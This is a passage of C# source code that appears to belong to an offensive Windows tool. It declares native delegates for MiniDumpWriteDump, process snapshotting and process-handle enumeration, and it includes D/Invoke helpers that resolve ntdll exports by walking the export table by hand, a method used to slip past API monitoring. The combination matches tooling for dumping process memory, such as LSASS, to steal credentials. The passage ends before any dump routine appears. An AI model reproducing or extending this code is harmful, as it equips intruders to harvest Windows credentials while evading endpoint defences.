using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using static Charles.STRUCTS;
using static Charles.STRUCTS.PSS_CAPTURE_FLAGS;
using static Charles.STRUCTS.PSS_QUERY_INFORMATION_CLASS;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System;

namespace Charles
{
    public class DELEGATES
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeFileHandle hFile, MINIDUMP_TYPE DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus PssNtCaptureSnapshot(out IntPtr SnapshotHandle, IntPtr hProcess, PSS_CAPTURE_FLAGS CaptureFlags, Int32 ThreadContextFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus PssNtQuerySnapshot(IntPtr SnapshotHandle, PSS_QUERY_INFORMATION_CLASS InformationClass, out IntPtr Buffer, Int32 BufferLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus PssNtFreeSnapshot(IntPtr SnapshotHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformation, out IntPtr Buffer, int SystemInformationLength, out IntPtr ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus NtOpenProcess(ref IntPtr pHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus NtGetNextProcess(IntPtr pHandle, int DesiredAccess, ulong HandleAttributes, ulong Flags, out IntPtr npHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus NtQueryInformationProcess(IntPtr pHandle, int ProcessInformationClass, IntPtr ProcessInformation, ulong ProcessInformationLength, out IntPtr ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NtStatus NtClose(IntPtr Handle);
    }
    public class STRUCTS
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [Flags]
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,

            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        public enum SYSTEM_INFORMATION_CLASS
        {
            SystemBasicInformation = 0,
            SystemPerformanceInformation = 2,
            SystemTimeOfDayInformation = 3,
            SystemProcessInformation = 5,
            SystemProcessorPerformanceInformation = 8,
            SystemHandleInformation = 16,
            SystemInterruptInformation = 23,
            SystemExceptionInformation = 33,
            SystemRegistryQuotaInformation = 37,
            SystemLookasideInformation = 45
        }

        public enum PSS_QUERY_INFORMATION_CLASS
        {
            PSS_QUERY_PROCESS_INFORMATION = 0,
            PSS_QUERY_VA_CLONE_INFORMATION = 1,
            PSS_QUERY_AUXILIARY_PAGES_INFORMATION = 2,
            PSS_QUERY_VA_SPACE_INFORMATION = 3,
            PSS_QUERY_HANDLE_INFORMATION = 4,
            PSS_QUERY_THREAD_INFORMATION = 5,
            PSS_QUERY_HANDLE_TRACE_INFORMATION = 6,
            PSS_QUERY_PERFORMANCE_COUNTERS = 7
        }

        public enum PSS_CAPTURE_FLAGS : uint
        {
            PSS_CAPTURE_NONE = 0x00000000,
            PSS_CAPTURE_VA_CLONE = 0x00000001,
            PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
            PSS_CAPTURE_HANDLES = 0x00000004,
            PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
            PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
            PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
            PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
            PSS_CAPTURE_THREADS = 0x00000080,
            PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
            PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
            PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
            PSS_CAPTURE_VA_SPACE = 0x00000800,
            PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
            PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
            PSS_CREATE_BREAKAWAY = 0x08000000,
            PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
            PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
            PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
            PSS_CREATE_RELEASE_SECTION = 0x80000000
        }

        public enum MINIDUMP_TYPE : uint
        {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithDataSegs = 0x00000001,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpFilterMemory = 0x00000008,
            MiniDumpScanMemory = 0x00000010,
            MiniDumpWithUnloadedModules = 0x00000020,
            MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
            MiniDumpFilterModulePaths = 0x00000080,
            MiniDumpWithProcessThreadData = 0x00000100,
            MiniDumpWithPrivateReadWriteMemory = 0x00000200,
            MiniDumpWithoutOptionalData = 0x00000400,
            MiniDumpWithFullMemoryInfo = 0x00000800,
            MiniDumpWithThreadInfo = 0x00001000,
            MiniDumpWithCodeSegs = 0x00002000,
            MiniDumpWithoutAuxiliaryState = 0x00004000,
            MiniDumpWithFullAuxiliaryState = 0x00008000,
            MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
            MiniDumpIgnoreInaccessibleMemory = 0x00020000,
            MiniDumpWithTokenInformation = 0x00040000,
            MiniDumpWithModuleHeaders = 0x00080000,
            MiniDumpFilterTriage = 0x00100000,
            MiniDumpWithAvxXStateContext = 0x00200000,
            MiniDumpWithIptTrace = 0x00400000,
            MiniDumpScanInaccessiblePartialPages = 0x00800000,
            MiniDumpFilterWriteCombinedMemory,
            MiniDumpValidTypeFlags = 0x01ffffff
        }


        // Structures and Enums 

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        public enum NtStatus : uint
        {
            // Success
            Success = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

    }

    public class Invoke
    {
        // Dinvoke core
        public static STRUCTS.NtStatus LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            };

            STRUCTS.NtStatus retValue = (STRUCTS.NtStatus)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);

            // Update the modified variables
            ModuleHandle = (IntPtr)funcargs[3];

            return retValue;
        }
        /// <summary>
        /// Helper for getting the base address of a module loaded by the current process. This base
        /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
        /// manual export parsing. This function uses the .NET System.Diagnostics.Process class.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                DestinationString, SourceString
            };

            DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

            // Update the modified variables
            DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
        }

        /// <summary>
        /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            STRUCTS.NtStatus CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != STRUCTS.NtStatus.Success || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            return hModule;
        }

        /// <summary>
        /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="DLLName">Name of the DLL.</param>
        /// <param name="FunctionName">Name of the function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }

        /// <summary>
        /// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }

        /// <summary>
        /// Helper for getting the pointer to a function from a DLL loaded by the process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
        /// <param name="FunctionName">Name of the exported procedure.</param>
        /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = true)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
